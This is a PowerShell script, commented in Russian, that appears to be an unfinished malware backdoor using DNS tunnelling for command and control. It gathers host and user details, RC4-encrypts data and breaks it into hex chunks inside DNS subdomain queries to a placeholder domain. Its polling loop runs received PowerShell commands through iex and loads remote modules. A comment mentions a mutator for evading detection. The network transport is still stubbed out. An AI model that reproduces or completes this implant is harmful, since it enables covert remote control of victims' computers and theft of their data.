# получение сис.инфы
function GetSystemInfo {
	$wlng = (Get-WinSystemLocale).Name;
	$kb_a = (Get-CimInstance -ClassName Win32_OperatingSystem).MUILanguages; 
	$c = $kb_a.Length; for ($i = 0; $i -le $c; $i++){ $kb += $kb_a[$i] + " " };
	$pc = $env:COMPUTERNAME;
	$user = $env:USERNAME;
	$win = (Get-CimInstance -ClassName Win32_OperatingSystem).Version;
	$arch = "x86"; if ([IntPtr]::Size -eq 8) { $arch += "-64" };
	$path = $PSCommandPath;
	$file = 0;
	if ($path) { $file = Split-Path $path -leaf }

	#язык системы
	#язык клавиатуры
	#имя компа
	#имя юзера
	#версия ОСи
	#рязрядность ОСи
	#путь
	#имя файла

	## TO DO :: определиться с форматом!

	Write-Host "===="
	Write-Host $wlng
	Write-Host $kb
	Write-Host $pc
	Write-Host $user
	Write-Host $win
	Write-Host $arch
	Write-Host $path
	Write-Host $file


}

# RC4 code/decode
function RC4 {Param($D,$K)
	$S=0..255;$J=0;$L=$K.Length;
	0..255|%{$J=($J+$S[$_]+$K[$_%$L])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$I=$J=0;
	ForEach($X in $D){$I=($I+1)%256;$J=($J+$S[$I])%256;$S[$I],$S[$J]=$S[$J],$S[$I];$X-bxor$S[($S[$I]+$S[$J])%256];}
}

# раскладывает хекс строку в массив байт
function hexstr2bytes {param($str)
	$len = $str.Length;
	$bytes = new-object byte[] ($len/2);
	for($i=0; $i -lt $len; $i += 2){ 
		$bytes[$i/2]=[convert]::ToByte($str.Substring($i,2),16) 
	}
	$bytes;
}

<#
dns_answer - отправка ответа на управляющий сервер посредством DNS запроса A
#>
function dns_answer {param(
	[UInt32]$build_id,
	[UInt32]$session_id,
	[UInt16]$command_id,
	[UInt32]$module_id,
	[string]$data,
	[string]$key,
	[string]$server
	)
	
	$result = 0;
	
	# длина данных
	$len = $data.Length;
	# размер блока = 100, но в хекс будет x2
	$bsize = 100*2;
	# кол-во пакетов c полным размером блока
	$count =[Math]::Floor($len / $bsize);
	# остаток
	$remainder = $len % $bsize;
	# общее число пакетов
	$total = $count;
	# +1 пакет с остатком, или это единственный пакет
	if ($remainder){ $total++ };
	
	<# 
	формирование START блока (старт блок не шифруется, т.к. содержит только hex-числа)
	
	ANSWER PACKET START
	packet_number = 0x0000
	data_size = 1 byte
	data - ...
	
	формат поля data:
	
	$build_id = 4 byte - зашито в скрипт
	session_id = 3 byte - 
	command_id = 1 byte - приходит с командой и возвращается как ответ на эту команду
	module_id = 4 byte - ID модуля кому предназначена команда (приходит с командой и возвращается как ответ на эту команду) может быть 0, зависит от команды
	packets_count = 4 byte - ожидаемое число пакетов для приема
	
	#>
	$build_id_x = [String]::Format("{0:X8}", $build_id);
	$session_id_x = [String]::Format("{0:X6}", $session_id);
	$command_id_x = [String]::Format("{0:X4}", $command_id);
	$module_id_x = [String]::Format("{0:X8}", $module_id);
	$packets_count = [String]::Format("{0:X8}", [UInt32]$total);
	# порядок присваивания может быть перемешан мутатором в любом порядке
	
	$buffer = $build_id_x + $session_id_x + $command_id_x + $module_id_x + $packets_count;
	$start_url = "0000" + ([String]::Format("{0:X2}", $buffer.Length)) + $buffer;
	$start_url += ".domain.com";
	$start_url
	# отправка START
	#
	#
	#

	# шифр
	$enc = [System.Text.Encoding]::UTF8;
	$buffer = $Enc.GetBytes($data);
	$k = $Enc.GetBytes($key);
	$rc4 = [System.BitConverter]::ToString((RC4 $buffer $k)) -replace '-','';
	
	<#
	ANSWER PACKET (промежуточный пакет отправки)
	packet_number = 2 byte (1..N)
	data_size = 1 byte
	data = 1..100

	total size(hex str): 8..206 bytes
	#>
	
	# счетчик пакетов
	$i=1; $count++;
	
	# отправка блоков >1
	# сюда никогда не зайдет, если блок единственный
	for($i; $i -lt $count; $i++)
	{
		$chunk = $rc4.Substring($i * $bsize, $bsize);
		
		# формирование блока
		$packet_url = ([String]::Format("{0:X4}", $i)) + ([String]::Format("{0:X2}", $chunk.Length)) + $chunk;
		
		# отправка
		#
		# TO DO
	}
	
	# отправка остаточного блока (или единственного)
	if ($remainder)
	{
		$chunk = $rc4.Substring($len - $remainder);
		
		# формирование блока
		$packet_url = ([String]::Format("{0:X4}", $i)) + ([String]::Format("{0:X2}", $chunk.Length)) + $chunk;
		$packet_url+= ".domain.com";
		$packet_url
		# отправка
		#
		# TO DO
	}
	
	<# 
	формирование END блока (END блок не шифруется, т.к. содержит только hex-числа и sha1)
	
	ANSWER PACKET END
	packet_number = 0xFFFF
	data_size = 1 byte - длина sha1 хеша всегда 20 байт, что в хекс строке = 40 байт = 0x28 можно записать без вычислений
	data - sha1 от массива байт RC4 buffer (ВНИМАНИЕ не от хекс строки!! иначе не сойдутся хеши)
	#>
	$sha1 = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA1CryptoServiceProvider).ComputeHash($Enc.GetBytes($rc4))) -replace '-','';
	$end_url = "FFFF28" + $sha1;
	$end_url  += ".domain.com";
	$end_url
	
	# отправка END
	#
	#
	#
	
	$result;
}

<#
cmd_processing - 
#>
function cmd_processing {param(
	[string]$cmd,
	[string]$key,
	$mod_list
	)
	
	<#
	типы команд

	0 - exit
	1 - exec_cmd - выполнение повершелл команды
	2 - load_module (факт передачи модуля, с ним же приходит и module_id, который назначается сервером и по нему идут репорты)
	3 - exec_mod - выполнение модульной команды по module_id, предача результата на сервер
	
	формат команды
	
	cmd_id = 1 byte - тип команды
	mod_id = 2 byte - ID модуля кому предназначена команда (для 0 и 1 всегда будет 0)
	cmd_size = 4 byte - длина команды
	cmd_data - тело команды
	#>

	# тип команды
	$cmd_id = [convert]::ToInt32([string]$cmd.Substring(0,2));
	if ($cmd_id -eq 0){Exit}; # при EXIT сразу на выход вобще из скрипта
	
	# длина команды (hex -> int)
	$cmd_size = [convert]::ToInt32([string]$cmd.Substring(6,8), 16);

	# тело команды + расшифровка 
	$enc = [System.Text.Encoding]::UTF8;	
	$buffer = hexstr2bytes $cmd.Substring(14,$cmd_size);
	$k = $Enc.GetBytes($key);
	$rc4 = RC4 $buffer $k;
	$cmd_data = $Enc.GetString($rc4);
	
	# выполнение повершелл команды?
	if ($cmd_id -eq 1)
	{
		# выполняем и сразу возвращаем результат
		return iex $cmd_data 2>&1 | Out-String;
	}
	
	# * * *  работа с модулями  * * *

	# ID модуля (hex -> int)
	$mod_id = [convert]::ToInt32([string]$cmd.Substring(2,4),16);

	# регистрация нового модуля
	if ($cmd_id -eq 2)
	{
		<#		
		ID модуля - это его индекс в массиве модулей (0,1,2,...) так мы избежим постоянного скана массива
		в поисках нужного модуля, а будем брать значение сразу по индексу
		#>
		$mod_list[$mod_id] = $cmd_data;
		return "OK";
	}
	
	# выполнение команды модуля
	if ($cmd_id -eq 3)
	{
		#
		# TO DO :: определить с формат модулей
		#
	}
}

# конфиг
$build_id = 123;
$key = "xyz";
$server = "1.2.3.4";


# массив модулей (индексы массива это их ID для быстрого доступа)
$mod_list = new-object string[] (256);

# начало работы (сбор и отправка инфы о системе)
$info = GetSystemInfo # <-- TO DO определить формат и отдать результат

dns_answer $build_id 0 0 0 $info $key $server

while (1){
	Start-Sleep -s 3
	
	#
	# TO DO запрос DNS TXT
	#
	$cmd = "...";
	
	# разбор и выполнение команд
	$result = cmd_processing $cmd $key $mod_list
	
	# отправка ответа
	dns_answer $build_id 0 0 0 $result $key $server
}
